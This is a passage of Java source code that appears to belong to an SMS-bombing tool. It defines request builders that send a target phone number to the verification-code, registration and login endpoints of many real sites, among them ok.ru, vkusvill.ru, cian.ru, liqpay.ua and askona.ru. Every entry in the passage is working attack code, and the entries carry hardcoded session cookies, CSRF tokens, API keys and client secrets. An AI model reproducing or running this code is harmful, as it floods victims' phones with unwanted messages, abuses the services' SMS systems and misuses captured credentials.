                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("cache-control", "max-age=0");
                    request.header("content-length", "25");
                    request.header("content-type", "application/x-www-form-urlencoded");
                    request.header("cookie", "JSESSIONID=a42d2ee7b58c347d1c614a1a013544a17651b0a68c29bd2f.9bedfb08; bci=1871035486256896851; _statid=5ea6268e-ddfb-4699-974c-d09fd19bb66a; landref=yandex.ru; viewport=1032; _ym_uid=1658092644731300424; _ym_d=1658092644; _ym_isad=1; mtrc=%7B%22mytrackerid%22%3A53328%7D");
                    request.header("dnt", "1");
                    request.header("origin", "https://ok.ru");
                    request.header("referer", "https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone");
                    request.header("sec-fetch-dest", "document");
                    request.header("sec-fetch-mode", "navigate");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("sec-fetch-user", "?1");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("upgrade-insecure-requests", "1");

                    builder.add("st.r.phone", "+" + phone.toString());
                }
            },

            new FormService("https://madyart.ru/local/aut.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("accept", "application/json, text/javascript, */*; q=0.01");
                    request.header("accept-encoding", "gzip, deflate, br");
                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("content-length", "219");
                    request.header("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                    request.header("cookie", "city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=4MjylRdnF2wecKdI9mZ644mmZBQPsJTr; BITRIX_SM_GUEST_ID=1119274; BITRIX_SM_LAST_ADV=7_Y; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A10%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153957133624831; _ym_d=1657153957; _ym_isad=1; _ym_visorc=w; city_checked=true; BITRIX_SM_LAST_VISIT=07.07.2022+03%3A36%3A40");
                    request.header("dnt", "1");
                    request.header("origin", "https://madyart.ru");
                    request.header("referer", "https://madyart.ru/reg/");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("sec-fetch-dest", "empty");
                    request.header("sec-fetch-mode", "cors");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("wct_reg_fio", getRussianName());
                    builder.add("wct_reg_fio2", getRussianName());
                    builder.add("wct_reg_phone", format(phone.getPhone(), "+7 (***) *** - ** - **"));
                    builder.add("wct_reg_ch", "Y");
                    builder.add("wct_reg_1", "");
                    builder.add("wct_reg_2", "");
                    builder.add("wct_reg_3", "1");
                    builder.add("wc_phone_psw", "Google123");
                    builder.add("wc_phone_psw2", "Google123");
                }
            },

            new FormService("https://orby.ru/local/ajax/auth/phone.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("accept", "*/*");
                    request.header("accept-encoding", "gzip, deflate, br");
                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("content-length", "63");
                    request.header("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                    request.header("cookie", "PHPSESSID=l5aBRN7PGJgASxApu4Xlw5gDPQW9rpXq; BITRIX_OR_cookieLocationNew=a%3A5%3A%7Bs%3A8%3A%22LOCATION%22%3Bs%3A10%3A%220000103664%22%3Bs%3A4%3A%22CITY%22%3Bs%3A29%3A%22%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3%22%3Bs%3A11%3A%22REGION_NAME%22%3Bs%3A41%3A%22%D0%9B%D0%B5%D0%BD%D0%B8%D0%BD%D0%B3%D1%80%D0%B0%D0%B4%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%3Bs%3A10%3A%22PRICE_TYPE%22%3Ba%3A2%3A%7Bs%3A4%3A%22CODE%22%3Bs%3A52%3A%22%D0%A4%D0%B8%D1%80%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F%20%D1%80%D0%BE%D0%B7%D0%BD%D0%B8%D1%86%D0%B0%20%D0%B0%D0%BA%D1%86%D0%B8%D0%BE%D0%BD%D0%BD%D0%B0%D1%8F%22%3Bs%3A2%3A%22ID%22%3Bi%3A10%3B%7Ds%3A12%3A%22FEDERAL_NAME%22%3BN%3B%7D; PAID_SOURCE_LABEL=na; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A20%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153918121826480; _ym_d=1657153918; _ym_visorc=w; _ym_isad=1; G_ENABLED_IDPS=google");
                    request.header("dnt", "1");
                    request.header("origin", "https://orby.ru");
                    request.header("referer", "https://orby.ru/");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("sec-fetch-dest", "empty");
                    request.header("sec-fetch-mode", "cors");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("phone", format(phone.getPhone(), "7 (***) *** ** **"));
                    builder.add("sessid", "408d7573119828883c19f6d2e908684b");
                }
            },

            new JsonService("https://auth.deliveryguru.ru/api/v1/authorization_requests/new") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("x-api-key", "x0EzVouy%-@Mv~EwAWp#V-?HlK2SVp{");
                    request.header("x-app-build", "3");
                    request.header("x-app-version", "1.1.0");
                    request.header("x-platform", "browser");
                    request.header("x-region-id", "34");
                    request.header("x-user-uuid", "be9e157b-02c6-43bf-9c40-cefc5f033776");

                    try {
                        return new JSONObject()
                                .put("client_id", "c9e64381-448c-ad0f-5c1b-6d75998afcd1")
                                .put("client_secret", "790b6b8c7eb1e0fcec7b81627f3f395c")
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://vkusvill.ru/ajax/user_v2/auth/check_phone.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=JFDE2S1WINIRUlqa6WMH4wIGsbN4V6ui; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix01; _vv_card=A402373; _gcl_au=1.1.1619096383.1661248403; _ym_uid=1661248404718516519; _ym_d=1661248404; tmr_lvid=4b0376f50a09ccffe9ca93755ced8567; tmr_lvidTS=1661248403869; _ga=GA1.2.395200366.1661248404; _gid=GA1.2.1193627669.1661248404; _gat_gtag_UA_138047372_1=1; _ym_isad=2; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=FHHjvoNFQne7JHtHv2Uo; mgo_cnt=1; mgo_sid=pk4lrh2bh011001q8wnp; _dc_gtm_UA-138047372-1=1; uxs_uid=6d9a40f0-22c9-11ed-a82b-25c841ac1c5b; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; tmr_detect=0%7C1661248406244; WE_USE_COOKIE=Y; tmr_reqNum=8");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("FUSER_ID", "207529943");
                    builder.add("USER_NAME", "");
                    builder.add("USER_PHONE", format(phone.getPhone(), "+7 (***) ***-****"));
                    builder.add("token", "");
                    builder.add("is_retry", "");
                    builder.add("AGREE_SUBSCRIBE", "Y");
                }
            },

            new FormService("http://mrroll.ru/user/signin", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=6a3c30f1f83147bdb07ec4dab8e9f7ac; _csrf=5e0e1518b8ce5a27921ed923860b7e259e50cbc584cf4855bc765312b34ef61ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220ONROmZvhM8Xut0-FdSdRSYoLt1OHKZW%22%3B%7D; _fbp=fb.1.1661248665305.699029426; _ga=GA1.2.1107717800.1661248666; _gid=GA1.2.2137931169.1661248666; _gat_gtag_UA_152986641_2=1; _gat_gtag_UA_152986641_1=1; _ym_uid=1656505428704518293; _ym_d=1661248666; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=68b0661d-18ac-4530-a240-ff2c5e219e84; id_city=fe9019692ac92b8570032e2a0069b475041d54256e3d7d5a4de7a25acd096086a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22id_city%22%3Bi%3A1%3Bi%3A1%3B%7D; id_cart=edec19223e33774d36a181ccad6e2226f3599fb751fb0831f449495e1ebff2bfa%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22id_cart%22%3Bi%3A1%3Bi%3A735413%3B%7D");
                    request.header("X-CSRF-Token", "xsuN5OL-sUIv0g64MasMSbVxCCe7J0n67bvexvV1Z-T2hMO2rZPrNEefNuBE3zxk8xVbQ-l0EJWhz--JvT49sw==");
                    request.header("X-Requested-With", "XMLHttpRequest");

                    builder.add("_csrf", "hX0BMbNIaZL_85OCtVbQNTeuodI5lN6gYkGjxUslBBe1Mk9j_CUz5Je-q9rAIuAYccrytmvHh88uNZKKA25eQA==");
                    builder.add("User[phone]", format(phone.getPhone(), "(***)***-**-**"));
                    builder.add("step", "send-sms");
                }
            },

            new JsonService("https://ud-api.cian.ru/validation-codes/v1/send-code/") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "_CIAN_GK=fed34d2d-0e0d-4363-80e1-db8007be7773; session_region_id=4777; __cf_bm=TfKpAqKCcOwCMtRx5Bbda7N58gNcyBsXws7c71T3bBY-1661249001-0-AaRhz3pFJnzJ8m1196Rw4lR8ZMhybYMc0ZWPvwpKt7uPxlQO8YraMKXJERORoHtsgZdhIh92S5qo4eu4tHYzfXU=; utm_source=mlsn; utm_campaign=web; utm_medium=301; login_mro_popup=1; _ga=GA1.2.647101164.1661249006; _gid=GA1.2.455236266.1661249006; sopr_utm=%7B%22utm_source%22%3A+%22mlsn%22%2C+%22utm_medium%22%3A+%22301%22%2C+%22utm_campaign%22%3A+%22web%22%7D; sopr_session=db64a7e8b3e24845; _dc_gtm_UA-30374201-1=1; lastSource=mlsn; uxfb_usertype=searcher; tmr_lvid=5b317c80cc3927428cb45330e4df4fcf; tmr_lvidTS=1661249006903; tmr_reqNum=2; _ym_uid=1661249007678488245; _ym_d=1661249007; uxs_uid=d520fb00-22ca-11ed-8717-8df5def2f0f4; _ym_isad=2; _ym_visorc=b; _gp10002511={\"utm\":\" - 74c06fb0\",\"hits\":1,\"vc\":1}; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Tue % 20Aug % 2023 % 202022\",\"idContainer\":\"10002511\"}; afUserId=d0735a66-4c08-49e3-840d-63a1e4096166-p; adrdel=1; adrcid=AFfUu_aT3HlWd7sNWdMFs0w; AF_SYNC=1661249008900");

                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone.toString())
                                .put("type", "authenticateCode")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://www.liqpay.ua/apiweb/login/start", 380) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "_gcl_au=1.1.2000038126.1661250974; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F104.0.5112.102%20Safari%2F537.36%20Edg%2F104.0.1293.63; _ga_SC8SJ5GD85=GS1.1.1661250974.1.0.1661250974.0.0.0; _fbp=fb.1.1661250974723.798111670; _ga=GA1.2.804869749.1661250975; _gid=GA1.2.1515868995.1661250975; _dc_gtm_UA-213775397-1=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fuk%2Flogin%2Flogin%2F1661250975005613_69027_PhMFILQwTvgiZrnm8B7X; _dc_gtm_UA-48226031-1=1");
                    request.header("-requested-with", "XMLHttpRequest");

                    builder.add("token", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("phone", phone.toString());
                    builder.add("pagetoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("checkouttoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("language", "uk");
                }
            },

            new FormService("https://aptechestvo.ru/ajax/new_app/sms/send_sms_code.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7(***) ***-**-**"));
                }
            },

            new JsonService("https://green-dostavka.by/api/v1/auth/request-confirm-code/", 375) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "tmr_lvid=0967463045c6bc62af3d493d4e61a7f6; tmr_lvidTS=1664384202297; _ga=GA1.2.618762003.1664384202; _gid=GA1.2.2070330642.1664384203; _dc_gtm_UA-175994570-1=1; _gat_UA-231562053-1=1; _ym_uid=1664384203181017640; _ym_d=1664384203; _ym_isad=2; _ym_visorc=w; _ga_0KMPZ479SN=GS1.1.1664384202.1.1.1664384204.58.0.0; tmr_detect=0|1664384205010; tmr_reqNum=6");

                    try {
                        return new JSONObject()
                                .put("phoneNumber", format(phone.getPhone(), "+375 ** *** ** **"))
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://sosedi.by/local/api/smsSend.php", 375) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "_gcl_au=1.1.440078486.1664384002; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ym_uid=1664384005288308463; _ym_d=1664384005; _ga=GA1.2.1716162404.1664384005; _gid=GA1.2.256273649.1664384005; tmr_lvid=6015526cad4b89db479519786a667a37; tmr_lvidTS=1664384004982; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; PHPSESSID=zlqD9vpWcOSVOhtY5iv9rjySBYog0QQk; _gat_gtag_UA_34496864_1=1; _ym_visorc=w; _ym_isad=2; tmr_detect=0|1664468829484; tmr_reqNum=12; cookiepolicyaccept=true");

                    try {
                        return new JSONObject()
                                .put("phone", format(phone.getPhone(), "+375 (**) *******"))
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://05.ru/api/v1/oauth/code/send/", 7) {
                @Override
                public void buildParams(Phone phone) {
                    request.header("authorization", "Bearer b7ab19fd-4014-11ed-8a9c-2e238dd6ce4a");

                    builder.addEncodedPathSegment(format(phone.getPhone(), "+7 (***) ***-**-**"));
                    builder.addQueryParameter("short", "true");
                }
            },

            new FormService("https://www.respect-shoes.kz/send_sms", 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("_token", "K0uMK3EpgqiMLt1pXeqsPoQxtnPZBWen98Sm41bH");
                    builder.add("tel", format(phone.getPhone(), "+7 (7**) ***-**-**"));

                    request.header("cookie", "_gcl_au=1.1.1523339745.1664471567; tmr_lvid=5cfff78042fa8318f8edede4e2f1780d; tmr_lvidTS=1659695387764; _gid=GA1.2.759847769.1664471567; _ym_uid=1659695389109290314; _ym_d=1664471567; roistat_visit=1941526; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=3fc27b9b-4797-4657-8bc9-b00a346625d6; ___dc=61a72ed9-acc4-44f9-ac7d-1fd9e1ea2ae8; Cookie_id=eyJpdiI6Imdpc216aGlUT1cwS1BaVVwvSXQ1OGZnPT0iLCJ2YWx1ZSI6IlpFMlJKWEFzOVwvbEVWejRYTm11d1JXZ2VQVTZZNk5kUjhSXC83R2tEMkpHMU52bDdXY1cxdVZrZ3JuWitMa0M5ciIsIm1hYyI6IjAzMTAwOTE1M2JiODZiZmU5YzJkZTkyNTVhOGRkODcxMzI1MDlhNDYyOGU3YzQ0YTIyNGUzOTBmMmViOTkyODgifQ==; siti_id=eyJpdiI6IlY1Vk1vTFBpUlwvRkp0c252QkFVMklnPT0iLCJ2YWx1ZSI6IkdkSnl0elk2NGF5SmNWWjhPdWxyZHc9PSIsIm1hYyI6Ijg2Y2E2NDhkZThlMDMzZDRmNzBhNDk2Mzg5YTk3OTkyNTZiNmNmOTAwZTc3MjZlZGIwODgwNjgwN2QwNmRiMjQifQ==; sitiset=eyJpdiI6InlWaUxXQjcxcGpPWUQrV3dBeXpWXC9nPT0iLCJ2YWx1ZSI6IkZiVXZmM2NGR0N0TUVMT2hyRWdZT2c9PSIsIm1hYyI6IjMyODM2YmRiMThlYzRmZDhhNjdkZGYxOTE2M2I3ZTIwNmQ2ZWZhOWQxOTQ1ZGZiMWRlODAzZDU3NjA2ZjAwYzcifQ==; roistat_call_tracking=1; roistat_emailtracking_email=null; roistat_emailtracking_tracking_email=null; roistat_emailtracking_emails=null; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,roistat_call_tracking,roistat_emailtracking_email,roistat_emailtracking_tracking_email,roistat_emailtracking_emails; _ga=GA1.2.111816835.1664471567; tmr_detect=0|1664471755330; tmr_reqNum=14; 499818=eyJpdiI6InNxWkp6M05Tajl4SlZXb2t5R1wvNFVnPT0iLCJ2YWx1ZSI6Im0xb3poMUJHclpSZFA3TnhqWXp3RVlrRFwvSUNBaVNRdXRPRmtjWGJ0M3Y2RzUrM052OG9YWE9yMnFMVExyK2cwWUNzOHFtb1wvd0E3c0JFemNmc0J1Rmc9PSIsIm1hYyI6IjRkMTdkZDVjZjY1ZmFjNWE0OWJjNGNiOGEwMGNiM2UyMzY1ZDQ2ZjIxM2Y4NTQ1NmVkYmMwNDQ2NTQ4ZmM3MjIifQ==; _ga_NFEYSRQ86N=GS1.1.1664471566.1.1.1664471942.0.0.0; XSRF-TOKEN=eyJpdiI6Ikt3MjZrY0NPQkpSZlNkY0J1ckpuSGc9PSIsInZhbHVlIjoia1BGNTFITnB3Z3ZlaFYrMzhoZWlIVmp6dHFcL0JvSjZST280bnJpRm9XejdBa2d6cjByODN3RTdoZE9NdG84blciLCJtYWMiOiIwMmE0OTkxNGRjMzc4OWYxZWIzMmNlNzRkYWMzZDVhNjI4ZDQ1NmVmMmRjN2Y5MTU1NzRiNGFkMzliODBmNDlmIn0=; laravel_session=eyJpdiI6IlwvRGpJdkVIY3RHdTlhRDRINWt6czRnPT0iLCJ2YWx1ZSI6ImFhaFVOWXpXdGRVVE1vWjRQXC9PNEQwaWEwaXFQaGNCZUhyemVncWp5YlI4VERxeFwvY3RicDFMWW9vNDVWcmFrZiIsIm1hYyI6IjA1MmNlNzM1NzNhNzc2OTg2MGFiMDQzZTY2ZmMxOGIyOTlhNzFiNTkwNjU3NDYyYzQ3MTYyMjkyODdlMTM2NzkifQ==; 768131=eyJpdiI6IkQ0cGlZcVUzNXNxUXNPaTNjNEcwRnc9PSIsInZhbHVlIjoiUk5URkR1Y05Vclc1Y01qbE5aUzJCZkdtMmp1Qll5WlNNeXNpeDV2MzVDYmtUcUZrT1wvcUVlaU1ianQraU41RTU1NWVEZVNGMkNCaVZuREN6U2ppV29BPT0iLCJtYWMiOiJkOThjNGE5ZTQwNGQxNjAwMWI0YmI2NmRiZjk1OTExNTNhOWI4YzcwNGE0N2IzNDcyNDRmNzBhMmIyNmFmYTM5In0=; tel=eyJpdiI6IlhLa2ExTVJsc3plZ1c4cEFiRGFIM1E9PSIsInZhbHVlIjoiZDB2MFpiMERqZTMxTzdBUkRVb0dSUT09IiwibWFjIjoiMjliZDdiZWQxYzNiYzkwZTM2MjJjNGNiY2ZmODY5MzQxYzE0MWEzODgzYWYyNTM5Mzg5YjYxNzJkMmQ4MzU1YSJ9");
                    request.header("X-Requested-With", "XMLHttpRequest");
                }
            },

            new FormService("https://id.kolesa.kz/getInfoAuth.json") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("project", "market");
                    builder.add("login", "+" + phone.toString());
                    builder.add("csrf", "czhDbUhLR1E5YUh1dHllZ0ZOdlU0UT09");
                    builder.add("restore", "0");
                    builder.add("iteration", "primary");

                    request.header("cookie", "ccid=vur2iajjpti6u660kdkii4mlgd; ssaid=e020e420-401b-11ed-b971-fb3d2d634bd2; __tld__=null");
                    request.header("X-Requested-With", "XMLHttpRequest");
                }
            },

            new Service() {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    Headers headers = new Headers.Builder()
                            .add("cookie", "unbi=bi6338267867f6a; _geolocation=moscow; pbc_type=organic; pbc_source=www.google.com; sectime=1664624248; split_test_version=0; homedecor_user_login=NP02_Guest; user_login=NP02_Guest; uguid=9d55fbecff8948c6ad768d8107824407; tmr_lvid=3a9ef8ccda42ea322050cfbd3a08c294; tmr_lvidTS=1664624252185; _gcl_au=1.1.1523130553.1664624253; _ga=GA1.2.1443167481.1664624253; _gid=GA1.2.1245790888.1664624253; PHP_SESS_ID=4f24fdafd3496dd22ee5e89ce34386e4; _ym_uid=1664624254750076678; _ym_d=1664624254; _ym_visorc=w; _ym_isad=2; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; PHPSESSID=0ce2acb938109732db8f4db4e439bfc1; flocktory-uuid=205dba54-034a-4e61-a4bf-d43c494f8653-0; G_ENABLED_IDPS=google; cto_bundle=TvF8B19BdFpxamprSnBRcXlPaGdDTGVFMyUyRjJaUGF5MHhrSFpVJTJCWGJ4aEV5V2ZJQ01LcjBJRTY0JTJGS0pGN2tPVWVLWEhPVUxLJTJGekVEOWtjcTBMdlglMkZQS1lpaGptNkkwJTJCaVNtJTJCR2xFaDJrOVV2d09yU1NzTjU4dmp4MXphZ0syUWFIa2g3YjhKTENqSnglMkI3bVpjZ1RoVTglMkJKd2clM0QlM0Q; mrc=app_id=652874&connectPartner=0&is_app_user=0&window_id=CometName_79ac111f18f1e1e8dceb2f39265a7379&sig=115a57f5e8a3d3b0d22484efb299a287; _tt_enable_cookie=1; _ttp=b3022b16-eda2-4252-aec0-a7582248ffda; tmr_detect=0|1664624257050; usergid=4ee56eaefde529eee2f934253e1f6709; tmr_reqNum=15")
                            .add("X-Requested-With", "XMLHttpRequest")
                            .add("Referer", "https://www.netprint.ru/order/profile")
                            .add("sec-ch-ua", "\"Microsoft Edge\";v=\"105\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"105\"")
                            .add("origin", "https://www.netprint.ru")
                            .add("content-length", "0")
                            .add("sec-ch-ua-platform", "\"Windows\"")
                            .add("sec-ch-ua-mobile", "?0")
                            .add("sec-fetch-dest", "empty")
                            .add("sec-fetch-mode", "no-cors")
                            .add("sec-fetch-site", "cross-site")
                            .build();

                    client.newCall(new Request.Builder()
                            .headers(headers)
                            .url("https://www.netprint.ru/order/social-auth")
                            .post(new FormBody.Builder()
                                    .add("operation", "stdreg")
                                    .add("dont_use_current_url", "")
                                    .add("email_or_phone", "+" + phone)
                                    .add("secret", "0ce2acb938109732db8f4db4e439bfc1")
                                    .add("i_agree_with_terms", "1")
                                    .add("current_url", "https://www.netprint.ru/order/profile")
                                    .build())
                            .build()
                    ).enqueue((Callback) (call, response) -> new Timer().schedule(new TimerTask() {
                        @Override
                        public void run() {
                            client.newCall(new Request.Builder()
                                    .headers(headers)
                                    .url("https://www.netprint.ru/order/social-auth")
                                    .post(new FormBody.Builder()
                                            .add("operation", "stdremaind")
                                            .add("secret", "")
                                            .add("email_or_phone", "+" + phone)
                                            .add("secret", "0ce2acb938109732db8f4db4e439bfc1")
                                            .build())
                                    .build()
                            ).enqueue(callback);
                        }
                    }, 10000));
                }
            },

            new ParamsService("https://www.askona.ru/api/v1/user/auth", 7) {
                @Override
                public void buildParams(Phone phone) {
                    request.header("cookie", "PHPSESSID=GAgA6oa-7eOFK8XdShPwTLUU-y0QtMX5ThXVc6C6t-Fj-V5PcK; BITRIX_SM_PK=457ed93f46978385969e18ff6e57ed3f; BITRIX_SM_SUBDOMAIN_SESS_RESET=1; BITRIX_SM_LOCATION_CODE=84; BITRIX_SM_USER_VISIT_COUNT={\"id\":\"3b7f1afc93c218394e392590c569aa52\",\"count\":1}; BITRIX_SM_USER_VISIT_COUNT_SETS=1; BITRIX_SM_SALE_UID=265533177; qrator_msid=1664626241.408.8PPyTjTEDwc5Lc7f-ttr1di97g85bgsiv8ar72brknotr8akb; kameleoonVisitorCode=_js_46bzuklxdbywcdg0; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":10,\"EXPIRE\":1664657940,\"UNIQUE\":[\"conversion_visit_day\"]}; _pk_ref.5.dfbc=[\"\",\"\",1664626247,\"https://www.google.com/\"]; _pk_id.5.dfbc=122c5427fb43ef88.1664626247.; _pk_ses.5.dfbc=1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gcl_au=1.1.1754048622.1664626247; pageviewCount=1; rrpvid=195358338639352; _ga=GA1.2.322325603.1664626247; _gid=GA1.2.526336325.1664626247; tmr_lvid=64de2a747acb078a87717adcb93a05d9; tmr_lvidTS=1664626247417; rcuid=6275fcd65368be000135cd22; _userGUID=0:l8pvhl0v:aJsyQDWXIe1Yh7ENPC7d~u_hXIftKtE7; dSesn=da61daa6-d823-d591-db6e-b8c9918b459e; _dvs=0:l8pvhl0v:IN9OjdyrUFL3EEsWmupYqIGmK2EP_lUR; _gat_UA-17566875-1=1; _ct_ids=vwgixinz:38342:357961914; _ct_session_id=357961914; _ct_site_id=38342; call_s=<!>{\"vwgixinz\":[1664628046,357961914,{\"155455\":\"627037\"}],\"d\":2}<!>; _ct=1400000000247485189; _ct_client_global_id=778c6766-f0a0-5505-92e0-eda27a05c774; adrdel=1; adrcid=AlWwQxQiyJ_pEXdeN3ElU6w; tmr_detect=0|1664626249896; _acfId=48c8c50a-65bf-4a01-9cea-31e2e641adaf; _acfVisit=2; _gat_UA-17566875-3=1; _gat_[object Object]=1; _ym_uid=1664626253885292605; _ym_d=1664626253; _ym_isad=2; cto_bundle=XQy3-V92T2E2N2pkMjVVck9seWlXdzI2WUhpVW9pZVZDWDJET1JWZ1NZcndhd2slMkJiUjZ0aUs0emRacHElMkJxVGdxcVVaRTAlMkJDVnQ0ZmpWYlElMkIwOENkVU5WZDdJQjFEMkJFaUhQV1ZnR2FFSXRycHg3Ujg5bHhpa093akpyJTJGbWNxd2RYSlY2NTdSRSUyRmJ0VHJwYnk1VWdtTE1SWFElM0QlM0Q; cted=modId=5tfjfgj3;client_id=322325603.1664626247|modId=vwgixinz;client_id=322325603.1664626247;ya_client_id=1664626253885292605; uxs_uid=1a4aff70-4182-11ed-b568-9723d80b192e; flocktory-uuid=c9e4ff56-ae12-4a45-8a08-afd5756afd41-3; _ga_21M08Q47LQ=GS1.1.1664626247.1.1.1664626273.34.0.0; tmr_reqNum=6");
                    request.header("x-bitrix-csrf-token", "true");
                    request.header("x-csrf-token", "true");

                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    builder.addQueryParameter("captchaToken", "");
                    builder.addQueryParameter("csrf_token", "9f189b70e3b3cdd5c82631b49188e76a");
                }
            },

            new FormService("https://api.yarus.ru/reg", 7) {
                @Override
                public void buildBody(Phone phone) {
